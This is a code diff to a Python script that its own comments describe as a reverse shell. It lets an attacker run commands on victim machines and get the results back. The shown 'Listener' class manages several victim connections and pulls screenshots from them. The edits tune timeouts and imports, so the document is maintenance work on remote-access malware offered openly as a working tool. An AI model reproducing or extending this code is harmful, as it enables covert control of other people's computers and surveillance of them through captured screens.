@@ -4,10 +4,8 @@
 # This script will establish the reverse shell connection between attacker and victim machine
 # Commands taken from attacker will be executed through this script on victim computer,
 # then the results will be sent back
-import struct
-import pickle
 
-import Cryptodome.Cipher.AES as AES
+# import Cryptodome.Cipher.AES as AES
 
 # Standard Modules
 import base64
@@ -19,6 +17,7 @@ import time
 import random
 from queue import Queue
 import select
+import struct
 
 
 class Listener:
@@ -162,8 +161,7 @@ class Listener:
                 try:
                     # Check if connection is still available
                     connection.send(msg)
-                    print(msg)
-                    ready = select.select([connection], [], [])
+                    ready = select.select([connection], [], [], 10)
                     if ready[0]:
                         connection.recv(1024).decode()
                     else:
@@ -186,7 +184,7 @@ class Listener:
     def get_screenshot(self, command, mode):
         if mode == "multi":
             self.send_data(command, "multi")
-            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 5)
+            ready = select.select(self.connection_list, self.connection_list, self.connection_list, 10)
             i = 0
             for connection in ready[1]:
                 raw_msglen = self.__recvlength(4, connection)
